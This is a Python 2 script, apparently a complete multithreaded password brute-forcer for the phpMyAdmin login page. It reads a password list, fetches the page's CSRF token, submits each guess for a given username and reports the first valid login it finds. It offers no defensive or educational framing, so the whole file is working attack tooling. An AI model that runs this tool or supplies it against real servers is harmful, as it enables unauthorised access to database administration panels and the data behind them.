import sys
import requests
import re
import threading
import Queue
import argparse
import traceback
from time import sleep

class pmaBruteThread(threading.Thread):
    queue = Queue.Queue()
    lock = threading.RLock()
    thread_count = 0
    tested_count = 0
    found = False
    _debug = False

    def debug(self, msg, output=sys.stderr):
        if pmaBruteThread._debug:
            pmaBruteThread.lock.acquire()
            print >> output, msg
            pmaBruteThread.lock.release()

    def error(self, msg, output=sys.stderr):
        pmaBruteThread.lock.acquire()
        print >> output, msg
        pmaBruteThread.lock.release()

    @staticmethod
    def is_idle():
        pmaBruteThread.lock.acquire()
        count = pmaBruteThread.thread_count
        pmaBruteThread.lock.release()
        return count == 0

    def increase(self):
        pmaBruteThread.lock.acquire()
        pmaBruteThread.tested_count += 1
        pmaBruteThread.lock.release()

    def increase_thread(self):
        pmaBruteThread.lock.acquire()
        pmaBruteThread.thread_count += 1
        self.debug('New thread created, ThreadCount=%d' % pmaBruteThread.thread_count)
        pmaBruteThread.lock.release()

    def decrease_thread(self):
        pmaBruteThread.lock.acquire()
        pmaBruteThread.thread_count -= 1
        self.debug('Thread exited, ThreadCount=%d' % pmaBruteThread.thread_count)
        pmaBruteThread.lock.release()

    def print_progress(self):
        pmaBruteThread.lock.acquire()
        sys.stdout.write('Current Progress: %d\r' % pmaBruteThread.tested_count)
        pmaBruteThread.lock.release()

    def __init__(self, url, retry_count=3):
        self.url = url
        self.retry_count = retry_count
        self.session = requests.Session()
        self.token = None
        threading.Thread.__init__(self)
        self.daemon = True
        self.increase_thread()
        self.start()

    def init_request(self):
        for i in xrange(self.retry_count):
            try:
                r = self.session.get(self.url)
                match = re.search(r'<input\s*type="hidden"\s*name="token"\s*value="(.+?)"\s*/?>', r.text, re.M|re.I)
                if not match:
                    continue
                else:
                    self.token = match.group(1)
                    break
            except:
                self.debug(traceback.format_exc())

    def test_one(self, user, password):
        data = {
            'pma_username': user,
            'pma_password': password,
            'server': 1,
            'token': self.token
        }
        for i in xrange(self.retry_count):
            try:
                r = self.session.post(self.url, data=data)
                if 'pmaPass-1' in self.session.cookies:
                    return True
                else:
                    match = re.search(r'<input\s*type="hidden"\s*name="token"\s*value="(.+?)"\s*/?>', r.text, re.M|re.I)
                    if match:
                        self.token = match.group(1)
                        return False
                    # else continue
            except:
                self.debug(traceback.format_exc())
        self.debug('Error trying username/password: %s/%s' % (user, password))
        return False    # can not get a legal response


    def run(self):
        # self.increase_thread()
        try:
            self.init_request()
            if not self.token:
                self.error('Unable to get token, thread exit.')
                return

            while not pmaBruteThread.found:
                try:
                    user, password = pmaBruteThread.queue.get(False)
                except Queue.Empty:
                    return
                one_result = self.test_one(user, password)
                self.increase()
                self.print_progress()
                if one_result:
                    print 'Valid login found: %s/%s' % (user, password)
                    print 'Quiting...'
                    pmaBruteThread.found = True
                    break
        except:
            self.error(traceback.format_exc())
        finally:
            self.decrease_thread()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('url', type=str, help='Target URL address(with port number if not default)')
    parser.add_argument('user', type=str, help='User name to brute force')
    parser.add_argument('passfile', type=str, help='Password list file')
    parser.add_argument('-t', '--thread', type=int, default=1, help='Thread count')
    parser.add_argument('--debug', type=bool, default=False, help='Debug mode')
    args = parser.parse_args()

    try:
        pmaBruteThread._debug = args.debug
        with open(args.passfile, 'r') as f:
            for password in f.readlines():
                pmaBruteThread.queue.put((args.user, password.strip()))
    except StandardError as exp:
        print >> sys.stderr, 'Error Reading Passfile: %s' % exp.message
        sys.exit(1)
    for i in xrange(args.thread):
        pmaBruteThread(args.url)
    try:
        while not pmaBruteThread.is_idle():
            sleep(0.5)
        print '\nDone.'
    except KeyboardInterrupt:
        print '\nUser Interrupt, Exit.'

